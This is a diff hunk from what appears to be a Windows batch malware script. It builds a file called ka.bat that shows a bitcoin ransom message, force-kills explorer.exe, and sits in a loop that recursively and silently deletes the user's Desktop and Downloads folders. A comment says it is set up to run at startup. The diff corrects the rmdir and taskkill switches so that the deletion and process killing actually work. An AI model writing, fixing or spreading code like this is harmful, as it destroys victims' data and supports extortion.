@@ -183,9 +183,9 @@ echo msg * To get back your normall shit... send 0,0031 bitcoin to: 13h4EMjcusGE
 echo ping localhost -n 4 >> ka.bat
 echo msg * RIP >> ka.bat
 echo :lol >> ka.bat
-echo rmdir "C:\users\%username%\Desktop" \Q \S >> ka.bat
-echo rmdir "C:\users\%username%\Downloads" \Q \S >> ka.bat
-echo taskkill explorer.exe >> ka.bat
+echo rmdir "C:\users\%username%\Desktop" /Q /S >> ka.bat
+echo rmdir "C:\users\%username%\Downloads" /Q /S >> ka.bat
+echo taskkill explorer.exe /F /im >> ka.bat
 echo goto lol >> ka.bat
 
 ::Create The .lnk File For Start As Startup::
